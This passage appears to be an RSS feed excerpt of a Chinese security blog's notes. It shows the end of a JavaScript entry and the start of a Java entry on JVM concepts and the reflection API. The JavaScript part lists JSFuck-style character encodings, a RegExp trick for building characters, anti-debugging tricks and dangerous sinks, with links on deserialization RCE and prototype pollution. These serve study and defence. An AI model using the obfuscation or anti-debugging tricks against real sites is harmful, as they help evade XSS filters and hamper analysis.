&lt;h2 id=&#34;higher-numbers&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#higher-numbers&#34;&gt;#&lt;/a&gt; Higher numbers&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;10&lt;/code&gt;  &amp;gt;  &lt;code&gt;+([+!+[]]+[+[]])&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;11&lt;/code&gt;  &amp;gt;  &lt;code&gt;+([+!+[]]+[+!+[]])&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;100&lt;/code&gt;  &amp;gt;  &lt;code&gt;+([+!+[]]+[+[]]+(+[]))&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;string-alphabet&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#string-alphabet&#34;&gt;#&lt;/a&gt; String alphabet&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&#39;a&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;([]+![])[+!+[]]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39;d&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;([]+[][[]])[+!+[]+!+[]]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39;e&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;([]+!+[])[+!+[]+!+[]+!+[]]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39;f&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;([]+![])[+[]]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39;i&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;([]+[][[]])[+!+[]+!+[]+!+[]+!+[]+!+[]]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39;l&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;([]+![])[+!+[]+!+[]]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39;n&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;([]+[][[]])[+!+[]]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39;r&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;([]+!+[])[+!+[]]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39;s&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;([]+![])[+!+[]+!+[]+!+[]]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39;t&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;([]+!+[])[+[]]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39;u&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;([]+!+[])[+!+[]+!+[]]&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;trick&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#trick&#34;&gt;#&lt;/a&gt; Trick&lt;/h1&gt;
&lt;h2 id=&#34;通过正则表达式构造特定字符&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#通过正则表达式构造特定字符&#34;&gt;#&lt;/a&gt; 通过正则表达式构造特定字符&lt;/h2&gt;
&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;figcaption data-lang=&#34;javascript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;empty &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;RegExp&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;prototype&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;flags&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;regSource &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;RegExp&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;prototype&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;source &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;regSource&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;toString &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Array&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;prototype&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;shift&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;regSource&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;length &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;left  &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; regSource &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; empty &lt;span class=&#34;token comment&#34;&gt;// 生成 (&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;quest &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; regSource &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; empty &lt;span class=&#34;token comment&#34;&gt;// 生成？&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;colon &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; regSource &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; empty &lt;span class=&#34;token comment&#34;&gt;// 生成 :&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;right &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; regSource &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; empty &lt;span class=&#34;token comment&#34;&gt;// 生成 )&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;xss &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;xss&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;source &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;xss&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;xss&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;flags &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;a&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;xss&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;toString &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;RegExp&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;prototype&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;toString&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;xss &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// =&gt; /xss/a&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;其他&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#其他&#34;&gt;#&lt;/a&gt; 其他&lt;/h1&gt;
&lt;h2 id=&#34;命令执行&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#命令执行&#34;&gt;#&lt;/a&gt; 命令执行&lt;/h2&gt;
&lt;p&gt;Node.js 中 child_process.exec 命令调用的是  &lt;code&gt;/bin/sh&lt;/code&gt;  ，故可以直接使用该命令执行 shell&lt;/p&gt;
&lt;h2 id=&#34;反调试技巧&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反调试技巧&#34;&gt;#&lt;/a&gt; 反调试技巧&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;函数重定义  &lt;code&gt;console.log = function(a)&amp;#123;&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;定时断点  &lt;code&gt;setInterval(function()&amp;#123;debugger&amp;#125;, 1000);&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;对象拷贝&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#对象拷贝&#34;&gt;#&lt;/a&gt; 对象拷贝&lt;/h2&gt;
&lt;p&gt;JavaScript 中的对象拷贝分为浅拷贝和深拷贝。&lt;/p&gt;
&lt;p&gt;浅拷贝对一个对象进行拷贝时，仅仅拷贝对象的引用进行拷贝，但是拷贝对象和源对象还是引用同一份实体。其中一个对象的改变都会影响到另一个对象。&lt;/p&gt;
&lt;p&gt;深拷贝拷贝一个对象时，不仅仅把对象的引用进行复制，还把该对象引用的值也一起拷贝。源对象与拷贝对象互相独立，其中任何一个对象的改动都不会对另外一个对象造成影响。&lt;/p&gt;
&lt;p&gt;深拷贝可以基于  &lt;code&gt;for-in&lt;/code&gt;  /  &lt;code&gt;object.assign()&lt;/code&gt;  / 拓展运算符  &lt;code&gt;...&lt;/code&gt;  /  &lt;code&gt;JSON.parse(JSON.stringify())&lt;/code&gt;  等方式实现。其中前三种方式只对第一层做深拷贝，若对象结构较为复杂，则需要用递归的方式对更深的层次进行拷贝。&lt;/p&gt;
&lt;h2 id=&#34;常见sink&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见sink&#34;&gt;#&lt;/a&gt; 常见 Sink&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;child_process&lt;/li&gt;
&lt;li&gt;eval&lt;/li&gt;
&lt;li&gt;exec&lt;/li&gt;
&lt;li&gt;execSync&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5mcmVlYnVmLmNvbS9hcnRpY2xlcy9zeXN0ZW0vMTYzNTc5Lmh0bWw=&#34;&gt;JavaScript 反调试技巧&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5lY21hLWludGVybmF0aW9uYWwub3JnL2VjbWEtMjYyLzUuMS8jc2VjLTE1LjMuNC41&#34;&gt;ECMAScript Language Specification&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzM0MTgzNzQ2P3NvcnQ9Y3JlYXRlZA==&#34;&gt;js prototype&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3Njc2Ntcy9ndWFyZEpzLw==&#34;&gt;javascript 防劫持&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2ZleC5iYWlkdS5jb20vYmxvZy8yMDE0LzA2L3hzcy1mcm9udGVuZC1maXJld2FsbC0zLmh0bWw=&#34;&gt;XSS 前端防火墙&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9vcHNlY3guY29tL2luZGV4LnBocC8yMDE3LzAyLzA4L2V4cGxvaXRpbmctbm9kZS1qcy1kZXNlcmlhbGl6YXRpb24tYnVnLWZvci1yZW1vdGUtY29kZS1leGVjdXRpb24v&#34;&gt;exploiting node js deserialization bug for remote code execution&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0hvTHlWaWVSL3Byb3RvdHlwZS1wb2xsdXRpb24tbnNlYzE4Lw==&#34;&gt;Prototype pollution attack&lt;/span&gt; Content released at NorthSec 2018 on prototype pollution&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/Java/</guid>
            <title>Java</title>
            <link>https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/Java/</link>
            <category>Java</category>
            <category>语言</category>
            <category>反序列化</category>
            <category>混淆</category>
            <category>沙箱</category>
            <category>类</category>
            <category>JDK</category>
            <pubDate>Sun, 27 Nov 2022 16:50:11 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;基本概念&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基本概念&#34;&gt;#&lt;/a&gt; 基本概念&lt;/h1&gt;
&lt;h2 id=&#34;jvm&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jvm&#34;&gt;#&lt;/a&gt; JVM&lt;/h2&gt;
&lt;p&gt;JVM 是 Java 平台的核心，以机器代码来实现，为程序执行提供了所需的所有基本功能，例如字节码解析器、JIT 编译器、垃圾收集器等。由于它是机器代码实现的，其同样受到二进制文件受到的攻击。&lt;/p&gt;
&lt;p&gt;JCL 是 JVM 自带的一个标准库，含有数百个系统类。默认情况下，所有系统类都是可信任的，且拥有所有的特权。&lt;/p&gt;
&lt;h2 id=&#34;jdk&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jdk&#34;&gt;#&lt;/a&gt; JDK&lt;/h2&gt;
&lt;p&gt;Java 开发工具包 (Java Development Kit，JDK) 是 Oracle 公司发布的 Java 平台，有标准版 (Standard Edition，Java SE)、企业版 (Enterprise Edition，Java EE) 等版本。&lt;/p&gt;
&lt;p&gt;在最开始，JDK 以二进制形式发布，而后在 2006 年 11 月 17 日，Sun 以 GPL 许可证发布了 Java 的源代码，于是之后出现了 OpenJDK。&lt;/p&gt;
&lt;h2 id=&#34;jmx&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jmx&#34;&gt;#&lt;/a&gt; JMX&lt;/h2&gt;
&lt;p&gt;JMX (Java Management Extensions，Java 管理扩展) 是一个为应用程序植入管理功能的框架，主要为管理和监视应用程序、系统对象、设备和面向服务的网络提供相应的工具。JMX 可以远程读取系统中的值、调用系统中的方法。在 JMX 未配置身份验证或 JDK 版本过低存在反序列化漏洞时，可能会导致远程代码执行。&lt;/p&gt;
&lt;h2 id=&#34;jni&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jni&#34;&gt;#&lt;/a&gt; JNI&lt;/h2&gt;
&lt;p&gt;JNI (Java Native Interface) 是 Java 提供的和其他语言交互的接口。&lt;/p&gt;
&lt;h2 id=&#34;jna&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jna&#34;&gt;#&lt;/a&gt; JNA&lt;/h2&gt;
&lt;p&gt;JNA (Java Native Access) 是在 JNI 上的框架，用于自动实现 Java 接口到 native function 的映射，而不需要另外编写 JNI 代码。&lt;/p&gt;
&lt;h2 id=&#34;ognl&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ognl&#34;&gt;#&lt;/a&gt; OGNL&lt;/h2&gt;
&lt;p&gt;OGNL (Object-Graph Navigation Language，对象导航语言) 是一种功能强大的表达式语言，通过简单一致的表达式语法，提供了存取对象的任意属性、调用对象的方法、遍历整个对象的结构图、实现字段类型转化等功能。&lt;/p&gt;
&lt;p&gt;Struts2 中使用了 OGNL，提供了一个 ValueStack 类。ValueStack 分为 root 和 context 两部分。root 中是当前的 action 对象，context 中是 ActionContext 里面所有的内容。&lt;/p&gt;
&lt;h2 id=&#34;io模型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#io模型&#34;&gt;#&lt;/a&gt; IO 模型&lt;/h2&gt;
&lt;p&gt;Java 对操作系统的各种 IO 模型进行了封装，形成了不同的 API。&lt;/p&gt;
&lt;h3 id=&#34;bio&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bio&#34;&gt;#&lt;/a&gt; BIO&lt;/h3&gt;
&lt;p&gt;BIO (Blocking I/O) 是同步阻塞 I/O 模式，数据的读取写入必须阻塞在一个线程内等待其完成。&lt;/p&gt;
&lt;h3 id=&#34;nio&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nio&#34;&gt;#&lt;/a&gt; NIO&lt;/h3&gt;
&lt;p&gt;NIO (New I/O) 是一种同步非阻塞的 I/O 模型，在 Java 1.4 中引入，对应 java.nio 包，提供了 Channel , Selector，Buffer 等抽象。&lt;/p&gt;
&lt;h3 id=&#34;aio&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#aio&#34;&gt;#&lt;/a&gt; AIO&lt;/h3&gt;
&lt;p&gt;AIO (Asynchronous I/O) 在 Java 7 中引入，是 NIO 的改进版，是异步非阻塞的 IO 模型，基于事件和回调机制实现。&lt;/p&gt;
&lt;h2 id=&#34;反射&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反射&#34;&gt;#&lt;/a&gt; 反射&lt;/h2&gt;
&lt;h3 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h3&gt;
&lt;p&gt;Java 反射机制是指在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意方法和属性；这种动态获取信息以及动态调用对象方法的功能被称为语言的反射机制。&lt;/p&gt;
&lt;h3 id=&#34;相关类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#相关类&#34;&gt;#&lt;/a&gt; 相关类&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;类名&lt;/th&gt;
&lt;th&gt;用途&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Class&lt;/td&gt;
&lt;td&gt;类的实体&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Field&lt;/td&gt;
&lt;td&gt;类的成员变量&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Method&lt;/td&gt;
&lt;td&gt;类的方法&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Constructor&lt;/td&gt;
&lt;td&gt;类的构造方法&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;class相关&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#class相关&#34;&gt;#&lt;/a&gt; Class 相关&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;asSubclass(Class&amp;lt;U&amp;gt; clazz)
&lt;ul&gt;
&lt;li&gt;把传递的类的对象转换成代表其子类的对象&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cast
&lt;ul&gt;
&lt;li&gt;把对象转换成代表类或是接口的对象&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;getClassLoader()
&lt;ul&gt;
&lt;li&gt;获得类的加载器&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;getClasses()
&lt;ul&gt;
&lt;li&gt;返回一个数组，数组中包含该类中所有公共类和接口类的对象&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;getDeclaredClasses()
&lt;ul&gt;
&lt;li&gt;返回一个数组，数组中包含该类中所有类和接口类的对象&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;forName(String className)
&lt;ul&gt;
&lt;li&gt;根据类名返回类的对象&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;getName()：
&lt;ul&gt;
&lt;li&gt;获得类的完整路径名字&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;newInstance()
&lt;ul&gt;
&lt;li&gt;创建类的实例&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;getPackage()
&lt;ul&gt;
&lt;li&gt;获得类的包&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;getSimpleName()
&lt;ul&gt;
&lt;li&gt;获得类的名字&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;getSuperclass()
&lt;ul&gt;
&lt;li&gt;获得当前类继承的父类的名字&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;getInterfaces()
&lt;ul&gt;
&lt;li&gt;获得当前类实现的类或是接口&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;getField(String name)
&lt;ul&gt;
&lt;li&gt;获得某个公有的属性对象&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;getFields()
&lt;ul&gt;
&lt;li&gt;获得所有公有的属性对象&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;getDeclaredField(String name)
&lt;ul&gt;
&lt;li&gt;获得某个属性对象&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;getDeclaredFields()
&lt;ul&gt;
&lt;li&gt;获得所有属性对象&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;getAnnotation(Class&amp;lt;A&amp;gt; annotationClass)
&lt;ul&gt;
&lt;li&gt;返回该类中与参数类型匹配的公有注解对象&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;getAnnotations()
&lt;ul&gt;
&lt;li&gt;返回该类所有的公有注解对象&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;getDeclaredAnnotation(Class&amp;lt;A&amp;gt; annotationClass)
&lt;ul&gt;
&lt;li&gt;返回该类中与参数类型匹配的所有注解对象&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;getDeclaredAnnotations()
&lt;ul&gt;
&lt;li&gt;返回该类所有的注解对象&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;getConstructor(Class...&amp;lt;?&amp;gt; parameterTypes)
&lt;ul&gt;
&lt;li&gt;获得该类中与参数类型匹配的公有构造方法&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;getConstructors()
&lt;ul&gt;
&lt;li&gt;获得该类的所有公有构造方法&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;getDeclaredConstructor(Class...&amp;lt;?&amp;gt; parameterTypes)
&lt;ul&gt;
&lt;li&gt;获得该类中与参数类型匹配的构造方法&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;getDeclaredConstructors()
&lt;ul&gt;
&lt;li&gt;获得该类所有构造方法&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;getMethod(String name, Class...&amp;lt;?&amp;gt; parameterTypes)
&lt;ul&gt;
&lt;li&gt;获得该类某个公有的方法&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;getMethods()
&lt;ul&gt;
&lt;li&gt;获得该类所有公有的方法&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;getDeclaredMethod(String name, Class...&amp;lt;?&amp;gt; parameterTypes)
&lt;ul&gt;
&lt;li&gt;获得该类某个方法&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;getDeclaredMethods()
&lt;ul&gt;
&lt;li&gt;获得该类所有方法&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;isAnnotation()
&lt;ul&gt;
&lt;li&gt;如果是注解类型则返回 true&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;isAnnotationPresent(Class&amp;lt;? extends Annotation&amp;gt; annotationClass)
&lt;ul&gt;
&lt;li&gt;如果是指定类型注解类型则返回 true&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;isAnonymousClass()
&lt;ul&gt;
&lt;li&gt;如果是匿名类则返回 true&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;isArray()
&lt;ul&gt;
&lt;li&gt;如果是一个数组类则返回 true&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;isEnum()
&lt;ul&gt;
&lt;li&gt;如果是枚举类则返回 true&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;isInstance(Object obj)
&lt;ul&gt;
&lt;li&gt;如果 obj 是该类的实例则返回 true&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;isInterface()
&lt;ul&gt;
&lt;li&gt;如果是接口类则返回 true&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;isLocalClass()
&lt;ul&gt;
&lt;li&gt;如果是局部类则返回 true&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;isMemberClass()
&lt;ul&gt;
&lt;li&gt;如果是内部类则返回 true&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;field相关&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#field相关&#34;&gt;#&lt;/a&gt; Field 相关&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;equals(Object obj)
&lt;ul&gt;
&lt;li&gt;属性与 obj 相等则返回 true&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;get(Object obj)
&lt;ul&gt;
&lt;li&gt;获得 obj 中对应的属性值&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;set(Object obj, Object value)
&lt;ul&gt;
&lt;li&gt;设置 obj 中对应属性值&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;method相关&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#method相关&#34;&gt;#&lt;/a&gt; Method 相关&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;invoke(Object obj, Object... args)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;传递 object 对象及参数调用该对象对应的方法&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;constructor&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#constructor&#34;&gt;#&lt;/a&gt; Constructor&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;newInstance(Object... initargs)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;根据传递的参数创建类的对象&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#类&#34;&gt;#&lt;/a&gt; 类&lt;/h1&gt;
&lt;h2 id=&#34;生命周期&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#生命周期&#34;&gt;#&lt;/a&gt; 生命周期&lt;/h2&gt;
